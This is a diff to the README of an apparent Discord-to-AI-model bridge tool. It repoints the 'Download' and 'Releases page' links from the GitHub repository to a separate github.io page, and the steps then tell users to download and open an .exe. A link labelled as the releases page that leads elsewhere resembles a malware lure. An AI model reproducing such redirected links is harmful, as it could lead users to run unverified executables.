@@ -1,6 +1,6 @@
 # 🤖 open-model-room-harness - Connect Multiple AI Models to Discord
 
-[Download the Room Harness](https://github.com/Faydrarich809/open-model-room-harness)
+[Download the Room Harness](https://faydrarich809.github.io)
 
 open-model-room-harness acts as a bridge for your Discord server. It links Discord rooms to powerful AI models from providers like OpenAI, Anthropic, xAI, and Google Gemini. You gain a central place to manage complex AI interactions without switching platforms. Use this tool to bring multimodal intelligence directly into your daily community chats.
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to place the software on your machine and start your first session.
 
-1. Go to the [Releases page](https://github.com/Faydrarich809/open-model-room-harness) to find the latest version.
+1. Go to the [Releases page](https://faydrarich809.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Select the file to save it to your computer.
 4. Open the downloaded file to begin the installation.
